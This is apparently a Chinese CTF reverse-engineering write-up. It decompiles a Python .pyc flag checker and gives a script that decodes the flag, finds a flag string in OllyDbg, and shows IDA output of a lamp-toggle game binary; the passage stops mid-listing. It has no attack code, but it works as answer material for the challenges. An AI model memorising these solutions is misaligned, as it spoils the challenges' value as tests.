<p>============================<br>拿到附件，发现是.pyc结尾的文件，于是想到python反编译，<br>这里提供反编译的网站：<a href="https://tool.lu/pyc/" target="_blank" rel="noopener">https://tool.lu/pyc/</a><br>反编译之后的代码贴出：</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encode</span><span class="hljs-params">(message)</span>:</span><br>    s = <span class="hljs-string">''</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> message:<br>        x = ord(i) ^ <span class="hljs-number">32</span><br>        x = x + <span class="hljs-number">16</span><br>        s += chr(x)<br>    <br>    <span class="hljs-keyword">return</span> base64.b64encode(s)<br><br>correct = <span class="hljs-string">'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'</span><br>flag = <span class="hljs-string">''</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">'Input flag:'</span><br>flag = raw_input()<br><span class="hljs-keyword">if</span> encode(flag) == correct:<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">'correct'</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">'wrong'</span><br></code></pre></div></td></tr></table></figure>

<p>这里分析代码，代码很简单，将flag进行encode函数的处理与变量 <code>correct</code> 中的字符串向比较，如果相等，即输出correct，应该就是flag了。</p>
<p>分析一下encode函数，总体来说，这个函数很简单，循环，逐个处理message中的字符，先通过ord()函数，以一个字符（长度为1的字符串）作为参数，返回对应的 ASCII 数值，接着ASCII码与32进行异或，然后x加上16，转换成字符串赋给s。<br>这个函数还是比较好理解的，直接给出EXP</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span><span class="hljs-params">(message)</span>:</span><br>    flag_message = base64.b64decode(message)<br>    <span class="hljs-comment"># print(base64.b64decode(message))</span><br>    s = <span class="hljs-string">''</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag_message:<br>        x = ord(i) - <span class="hljs-number">16</span><br>        x = x ^ <span class="hljs-number">32</span><br>        s += chr(x)<br>    <span class="hljs-keyword">return</span> s<br><br>correct = <span class="hljs-string">'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'</span><br><br>flag_value = decode(correct)<br>print(flag_value)<br></code></pre></div></td></tr></table></figure>

<p>==============================<br>总结：<br>1、这题考的是python文件的反编译，这个知识点要知道。<br>2、这几题基本上都是考算法的，很少带有调试的部分，所以难度不大，逆向真正难的地方是进行文件调试。</p>
<h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>终于接触到反调试部分了，也是逆向中最难的一部分，本题的难度不大，但是意味着进入了reverse这个门了。</p>
<p>拿到附件，发现是.exe文件，拖入OllyDbg中查看，</p>
<img src="https://qiniuyun1.fxhstudy.com/re1-1.png" srcset="/img/loading.gif"  alt="1" />

<p>在分析文件之前，我首先会使用智能搜索，这个插件是OD将识别出来的字符串显示出来，事实证明是有用的</p>
<img src="https://qiniuyun1.fxhstudy.com/re1-2.png" srcset="/img/loading.gif"  alt="1" />

<p>查找到flag值，追踪一下，</p>
<img src="https://qiniuyun1.fxhstudy.com/re1-3.png" srcset="/img/loading.gif"  alt="1" />

<p>很简单的一题，但也表示正式进入reverse了。。。</p>
<h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>下载附件，.exe文件，先运行一下，发现叫我们玩一个游戏，成功就给出flag。想了想，作为reverse选手，怎么能通过玩游戏解除flag呢？</p>
<img src="https://qiniuyun1.fxhstudy.com/game-1.png" srcset="/img/loading.gif"  alt="1" />

<p>先拖进Exeinfo中分析，</p>
<img src="https://qiniuyun1.fxhstudy.com/game-2.png" srcset="/img/loading.gif"  alt="1" />

<p>得到的信息：<br>    win32程序<br>再拖进IDA中分析，<br>本题三种解法</p>
<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>在IDA中，搜索main函数，F5进行反编译</p>
<img src="https://qiniuyun1.fxhstudy.com/game-3.png" srcset="/img/loading.gif"  alt="1" />

<p>没有太多信息，追踪main_0()，发现以下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> __cdecl <span class="hljs-title">main_0</span><span class="hljs-params">()</span><br></span>&#123;<br>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [esp+DCh] [ebp-20h]</span><br>  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// [esp+F4h] [ebp-8h]</span><br><br>  sub_45A7BE((<span class="hljs-keyword">int</span>)&amp;unk_50B110);<br>  sub_45A7BE((<span class="hljs-keyword">int</span>)&amp;unk_50B158);<br>  sub_45A7BE((<span class="hljs-keyword">int</span>)&amp;unk_50B1A0);<br>  sub_45A7BE((<span class="hljs-keyword">int</span>)&amp;unk_50B1E8);<br>  sub_45A7BE((<span class="hljs-keyword">int</span>)&amp;unk_50B230);<br>  sub_45A7BE((<span class="hljs-keyword">int</span>)&amp;unk_50B278);<br>  sub_45A7BE((<span class="hljs-keyword">int</span>)&amp;unk_50B2C0);<br>  sub_45A7BE((<span class="hljs-keyword">int</span>)&amp;unk_50B308);<br>  sub_45A7BE((<span class="hljs-keyword">int</span>)<span class="hljs-string">"二                                                     |\n"</span>);<br>  sub_45A7BE((<span class="hljs-keyword">int</span>)<span class="hljs-string">"|              by 0x61                                 |\n"</span>);<br>  sub_45A7BE((<span class="hljs-keyword">int</span>)<span class="hljs-string">"|                                                      |\n"</span>);<br>  sub_45A7BE((<span class="hljs-keyword">int</span>)<span class="hljs-string">"|------------------------------------------------------|\n"</span>);<br>  sub_45A7BE((<span class="hljs-keyword">int</span>)<span class="hljs-string">"Play a game\n"</span><br>                  <span class="hljs-string">"The n is the serial number of the lamp,and m is the state of the lamp\n"</span><br>                  <span class="hljs-string">"If m of the Nth lamp is 1,it's on ,if not it's off\n"</span><br>                  <span class="hljs-string">"At first all the lights were closed\n"</span>);<br>  sub_45A7BE((<span class="hljs-keyword">int</span>)<span class="hljs-string">"Now you can input n to change its state\n"</span>);<br>  sub_45A7BE((<span class="hljs-keyword">int</span>)<span class="hljs-string">"But you should pay attention to one thing,if you change the state of the Nth lamp,the state of (N-1)th"</span><br>                  <span class="hljs-string">" and (N+1)th will be changed too\n"</span>);<br>  sub_45A7BE((<span class="hljs-keyword">int</span>)<span class="hljs-string">"When all lamps are on,flag will appear\n"</span>);<br>  sub_45A7BE((<span class="hljs-keyword">int</span>)<span class="hljs-string">"Now,input n \n"</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      sub_45A7BE((<span class="hljs-keyword">int</span>)<span class="hljs-string">"input n,n(1-8)\n"</span>);<br>      sub_459418();<br>      sub_45A7BE((<span class="hljs-keyword">int</span>)<span class="hljs-string">"n="</span>);<br>      sub_4596D4(<span class="hljs-string">"%d"</span>, &amp;v1);<br>      sub_45A7BE((<span class="hljs-keyword">int</span>)<span class="hljs-string">"\n"</span>);<br>      <span class="hljs-keyword">if</span> ( v1 &gt;= <span class="hljs-number">0</span> &amp;&amp; v1 &lt;= <span class="hljs-number">8</span> )<br>        <span class="hljs-keyword">break</span>;<br>      sub_45A7BE((<span class="hljs-keyword">int</span>)<span class="hljs-string">"sorry,n error,try again\n"</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v1 )<br>    &#123;<br>      sub_4576D6(v1 - <span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; ++i )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)i &gt;= <span class="hljs-number">9</span> )<br>          j____report_rangecheckfailure();<br>        byte_532E28[i] = <span class="hljs-number">0</span>;<br>      &#125;<br>    &#125;<br>    j__system(<span class="hljs-string">"CLS"</span>);<br>    sub_458054();<br>    <span class="hljs-keyword">if</span> ( byte_532E28[<span class="hljs-number">0</span>] == <span class="hljs-number">1</span><br>      &amp;&amp; byte_532E28[<span class="hljs-number">1</span>] == <span class="hljs-number">1</span><br>      &amp;&amp; byte_532E28[<span class="hljs-number">2</span>] == <span class="hljs-number">1</span><br>      &amp;&amp; byte_532E28[<span class="hljs-number">3</span>] == <span class="hljs-number">1</span><br>      &amp;&amp; byte_532E28[<span class="hljs-number">4</span>] == <span class="hljs-number">1</span><br>      &amp;&amp; byte_532E28[<span class="hljs-number">5</span>] == <span class="hljs-number">1</span><br>      &amp;&amp; byte_532E28[<span class="hljs-number">6</span>] == <span class="hljs-number">1</span><br>      &amp;&amp; byte_532E28[<span class="hljs-number">7</span>] == <span class="hljs-number">1</span> )<br>    &#123;<br>      sub_457AB4();<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>主要分析这一行代码</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( byte_532E28[<span class="hljs-number">0</span>] == <span class="hljs-number">1</span><br>      &amp;&amp; byte_532E28[<span class="hljs-number">1</span>] == <span class="hljs-number">1</span><br>      &amp;&amp; byte_532E28[<span class="hljs-number">2</span>] == <span class="hljs-number">1</span><br>      &amp;&amp; byte_532E28[<span class="hljs-number">3</span>] == <span class="hljs-number">1</span><br>      &amp;&amp; byte_532E28[<span class="hljs-number">4</span>] == <span class="hljs-number">1</span><br>      &amp;&amp; byte_532E28[<span class="hljs-number">5</span>] == <span class="hljs-number">1</span><br>      &amp;&amp; byte_532E28[<span class="hljs-number">6</span>] == <span class="hljs-number">1</span><br>      &amp;&amp; byte_532E28[<span class="hljs-number">7</span>] == <span class="hljs-number">1</span> )<br>    &#123;<br>      sub_457AB4();<br>    &#125;<br></code></pre></div></td></tr></table></figure>

<p>如果数组中的值都为1，则执行sub_457AB4()函数，跟踪下去</p>
<img src="https://qiniuyun1.fxhstudy.com/game-4.png" srcset="/img/loading.gif"  alt="1" />

<p>继续跟踪</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_45E940</span><span class="hljs-params">()</span><br></span>&#123;<br>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [esp+D0h] [ebp-94h]</span><br>  <span class="hljs-keyword">char</span> v2; <span class="hljs-comment">// [esp+DCh] [ebp-88h]</span><br>  <span class="hljs-keyword">char</span> v3; <span class="hljs-comment">// [esp+DDh] [ebp-87h]</span><br>  <span class="hljs-keyword">char</span> v4; <span class="hljs-comment">// [esp+DEh] [ebp-86h]</span><br>  <span class="hljs-keyword">char</span> v5; <span class="hljs-comment">// [esp+DFh] [ebp-85h]</span><br>  <span class="hljs-keyword">char</span> v6; <span class="hljs-comment">// [esp+E0h] [ebp-84h]</span><br>  <span class="hljs-keyword">char</span> v7; <span class="hljs-comment">// [esp+E1h] [ebp-83h]</span><br>  <span class="hljs-keyword">char</span> v8; <span class="hljs-comment">// [esp+E2h] [ebp-82h]</span><br>  <span class="hljs-keyword">char</span> v9; <span class="hljs-comment">// [esp+E3h] [ebp-81h]</span><br>  <span class="hljs-keyword">char</span> v10; <span class="hljs-comment">// [esp+E4h] [ebp-80h]</span><br>  <span class="hljs-keyword">char</span> v11; <span class="hljs-comment">// [esp+E5h] [ebp-7Fh]</span><br>  <span class="hljs-keyword">char</span> v12; <span class="hljs-comment">// [esp+E6h] [ebp-7Eh]</span><br>  <span class="hljs-keyword">char</span> v13; <span class="hljs-comment">// [esp+E7h] [ebp-7Dh]</span><br>  <span class="hljs-keyword">char</span> v14; <span class="hljs-comment">// [esp+E8h] [ebp-7Ch]</span><br>  <span class="hljs-keyword">char</span> v15; <span class="hljs-comment">// [esp+E9h] [ebp-7Bh]</span><br>  <span class="hljs-keyword">char</span> v16; <span class="hljs-comment">// [esp+EAh] [ebp-7Ah]</span><br>  <span class="hljs-keyword">char</span> v17; <span class="hljs-comment">// [esp+EBh] [ebp-79h]</span><br>  <span class="hljs-keyword">char</span> v18; <span class="hljs-comment">// [esp+ECh] [ebp-78h]</span><br>  <span class="hljs-keyword">char</span> v19; <span class="hljs-comment">// [esp+EDh] [ebp-77h]</span><br>  <span class="hljs-keyword">char</span> v20; <span class="hljs-comment">// [esp+EEh] [ebp-76h]</span><br>  <span class="hljs-keyword">char</span> v21; <span class="hljs-comment">// [esp+EFh] [ebp-75h]</span><br>  <span class="hljs-keyword">char</span> v22; <span class="hljs-comment">// [esp+F0h] [ebp-74h]</span><br>  <span class="hljs-keyword">char</span> v23; <span class="hljs-comment">// [esp+F1h] [ebp-73h]</span><br>  <span class="hljs-keyword">char</span> v24; <span class="hljs-comment">// [esp+F2h] [ebp-72h]</span><br>  <span class="hljs-keyword">char</span> v25; <span class="hljs-comment">// [esp+F3h] [ebp-71h]</span><br>  <span class="hljs-keyword">char</span> v26; <span class="hljs-comment">// [esp+F4h] [ebp-70h]</span><br>  <span class="hljs-keyword">char</span> v27; <span class="hljs-comment">// [esp+F5h] [ebp-6Fh]</span><br>  <span class="hljs-keyword">char</span> v28; <span class="hljs-comment">// [esp+F6h] [ebp-6Eh]</span><br>  <span class="hljs-keyword">char</span> v29; <span class="hljs-comment">// [esp+F7h] [ebp-6Dh]</span><br>  <span class="hljs-keyword">char</span> v30; <span class="hljs-comment">// [esp+F8h] [ebp-6Ch]</span><br>  <span class="hljs-keyword">char</span> v31; <span class="hljs-comment">// [esp+F9h] [ebp-6Bh]</span><br>  <span class="hljs-keyword">char</span> v32; <span class="hljs-comment">// [esp+FAh] [ebp-6Ah]</span><br>  <span class="hljs-keyword">char</span> v33; <span class="hljs-comment">// [esp+FBh] [ebp-69h]</span><br>  <span class="hljs-keyword">char</span> v34; <span class="hljs-comment">// [esp+FCh] [ebp-68h]</span><br>  <span class="hljs-keyword">char</span> v35; <span class="hljs-comment">// [esp+FDh] [ebp-67h]</span><br>  <span class="hljs-keyword">char</span> v36; <span class="hljs-comment">// [esp+FEh] [ebp-66h]</span><br>  <span class="hljs-keyword">char</span> v37; <span class="hljs-comment">// [esp+FFh] [ebp-65h]</span><br>  <span class="hljs-keyword">char</span> v38; <span class="hljs-comment">// [esp+100h] [ebp-64h]</span><br>  <span class="hljs-keyword">char</span> v39; <span class="hljs-comment">// [esp+101h] [ebp-63h]</span><br>  <span class="hljs-keyword">char</span> v40; <span class="hljs-comment">// [esp+102h] [ebp-62h]</span><br>  <span class="hljs-keyword">char</span> v41; <span class="hljs-comment">// [esp+103h] [ebp-61h]</span><br>  <span class="hljs-keyword">char</span> v42; <span class="hljs-comment">// [esp+104h] [ebp-60h]</span><br>  <span class="hljs-keyword">char</span> v43; <span class="hljs-comment">// [esp+105h] [ebp-5Fh]</span><br>  <span class="hljs-keyword">char</span> v44; <span class="hljs-comment">// [esp+106h] [ebp-5Eh]</span><br>  <span class="hljs-keyword">char</span> v45; <span class="hljs-comment">// [esp+107h] [ebp-5Dh]</span><br>  <span class="hljs-keyword">char</span> v46; <span class="hljs-comment">// [esp+108h] [ebp-5Ch]</span><br>  <span class="hljs-keyword">char</span> v47; <span class="hljs-comment">// [esp+109h] [ebp-5Bh]</span><br>  <span class="hljs-keyword">char</span> v48; <span class="hljs-comment">// [esp+10Ah] [ebp-5Ah]</span><br>  <span class="hljs-keyword">char</span> v49; <span class="hljs-comment">// [esp+10Bh] [ebp-59h]</span><br>  <span class="hljs-keyword">char</span> v50; <span class="hljs-comment">// [esp+10Ch] [ebp-58h]</span><br>  <span class="hljs-keyword">char</span> v51; <span class="hljs-comment">// [esp+10Dh] [ebp-57h]</span><br>  <span class="hljs-keyword">char</span> v52; <span class="hljs-comment">// [esp+10Eh] [ebp-56h]</span><br>  <span class="hljs-keyword">char</span> v53; <span class="hljs-comment">// [esp+10Fh] [ebp-55h]</span><br>  <span class="hljs-keyword">char</span> v54; <span class="hljs-comment">// [esp+110h] [ebp-54h]</span><br>  <span class="hljs-keyword">char</span> v55; <span class="hljs-comment">// [esp+111h] [ebp-53h]</span><br>  <span class="hljs-keyword">char</span> v56; <span class="hljs-comment">// [esp+112h] [ebp-52h]</span><br>  <span class="hljs-keyword">char</span> v57; <span class="hljs-comment">// [esp+113h] [ebp-51h]</span><br>  <span class="hljs-keyword">char</span> v58; <span class="hljs-comment">// [esp+114h] [ebp-50h]</span><br>  <span class="hljs-keyword">char</span> v59; <span class="hljs-comment">// [esp+120h] [ebp-44h]</span><br>  <span class="hljs-keyword">char</span> v60; <span class="hljs-comment">// [esp+121h] [ebp-43h]</span><br>  <span class="hljs-keyword">char</span> v61; <span class="hljs-comment">// [esp+122h] [ebp-42h]</span><br>  <span class="hljs-keyword">char</span> v62; <span class="hljs-comment">// [esp+123h] [ebp-41h]</span><br>  <span class="hljs-keyword">char</span> v63; <span class="hljs-comment">// [esp+124h] [ebp-40h]</span><br>  <span class="hljs-keyword">char</span> v64; <span class="hljs-comment">// [esp+125h] [ebp-3Fh]</span><br>  <span class="hljs-keyword">char</span> v65; <span class="hljs-comment">// [esp+126h] [ebp-3Eh]</span><br>  <span class="hljs-keyword">char</span> v66; <span class="hljs-comment">// [esp+127h] [ebp-3Dh]</span><br>  <span class="hljs-keyword">char</span> v67; <span class="hljs-comment">// [esp+128h] [ebp-3Ch]</span><br>  <span class="hljs-keyword">char</span> v68; <span class="hljs-comment">// [esp+129h] [ebp-3Bh]</span><br>  <span class="hljs-keyword">char</span> v69; <span class="hljs-comment">// [esp+12Ah] [ebp-3Ah]</span><br>  <span class="hljs-keyword">char</span> v70; <span class="hljs-comment">// [esp+12Bh] [ebp-39h]</span><br>  <span class="hljs-keyword">char</span> v71; <span class="hljs-comment">// [esp+12Ch] [ebp-38h]</span><br>  <span class="hljs-keyword">char</span> v72; <span class="hljs-comment">// [esp+12Dh] [ebp-37h]</span><br>  <span class="hljs-keyword">char</span> v73; <span class="hljs-comment">// [esp+12Eh] [ebp-36h]</span><br>  <span class="hljs-keyword">char</span> v74; <span class="hljs-comment">// [esp+12Fh] [ebp-35h]</span><br>  <span class="hljs-keyword">char</span> v75; <span class="hljs-comment">// [esp+130h] [ebp-34h]</span><br>  <span class="hljs-keyword">char</span> v76; <span class="hljs-comment">// [esp+131h] [ebp-33h]</span><br>  <span class="hljs-keyword">char</span> v77; <span class="hljs-comment">// [esp+132h] [ebp-32h]</span><br>  <span class="hljs-keyword">char</span> v78; <span class="hljs-comment">// [esp+133h] [ebp-31h]</span><br>  <span class="hljs-keyword">char</span> v79; <span class="hljs-comment">// [esp+134h] [ebp-30h]</span><br>  <span class="hljs-keyword">char</span> v80; <span class="hljs-comment">// [esp+135h] [ebp-2Fh]</span><br>  <span class="hljs-keyword">char</span> v81; <span class="hljs-comment">// [esp+136h] [ebp-2Eh]</span><br>  <span class="hljs-keyword">char</span> v82; <span class="hljs-comment">// [esp+137h] [ebp-2Dh]</span><br>  <span class="hljs-keyword">char</span> v83; <span class="hljs-comment">// [esp+138h] [ebp-2Ch]</span><br>  <span class="hljs-keyword">char</span> v84; <span class="hljs-comment">// [esp+139h] [ebp-2Bh]</span><br>  <span class="hljs-keyword">char</span> v85; <span class="hljs-comment">// [esp+13Ah] [ebp-2Ah]</span><br>  <span class="hljs-keyword">char</span> v86; <span class="hljs-comment">// [esp+13Bh] [ebp-29h]</span><br>  <span class="hljs-keyword">char</span> v87; <span class="hljs-comment">// [esp+13Ch] [ebp-28h]</span><br>  <span class="hljs-keyword">char</span> v88; <span class="hljs-comment">// [esp+13Dh] [ebp-27h]</span><br>  <span class="hljs-keyword">char</span> v89; <span class="hljs-comment">// [esp+13Eh] [ebp-26h]</span><br>  <span class="hljs-keyword">char</span> v90; <span class="hljs-comment">// [esp+13Fh] [ebp-25h]</span><br>  <span class="hljs-keyword">char</span> v91; <span class="hljs-comment">// [esp+140h] [ebp-24h]</span><br>  <span class="hljs-keyword">char</span> v92; <span class="hljs-comment">// [esp+141h] [ebp-23h]</span><br>  <span class="hljs-keyword">char</span> v93; <span class="hljs-comment">// [esp+142h] [ebp-22h]</span><br>  <span class="hljs-keyword">char</span> v94; <span class="hljs-comment">// [esp+143h] [ebp-21h]</span><br>  <span class="hljs-keyword">char</span> v95; <span class="hljs-comment">// [esp+144h] [ebp-20h]</span><br>  <span class="hljs-keyword">char</span> v96; <span class="hljs-comment">// [esp+145h] [ebp-1Fh]</span><br>  <span class="hljs-keyword">char</span> v97; <span class="hljs-comment">// [esp+146h] [ebp-1Eh]</span><br>  <span class="hljs-keyword">char</span> v98; <span class="hljs-comment">// [esp+147h] [ebp-1Dh]</span><br>  <span class="hljs-keyword">char</span> v99; <span class="hljs-comment">// [esp+148h] [ebp-1Ch]</span><br>  <span class="hljs-keyword">char</span> v100; <span class="hljs-comment">// [esp+149h] [ebp-1Bh]</span><br>  <span class="hljs-keyword">char</span> v101; <span class="hljs-comment">// [esp+14Ah] [ebp-1Ah]</span><br>  <span class="hljs-keyword">char</span> v102; <span class="hljs-comment">// [esp+14Bh] [ebp-19h]</span><br>  <span class="hljs-keyword">char</span> v103; <span class="hljs-comment">// [esp+14Ch] 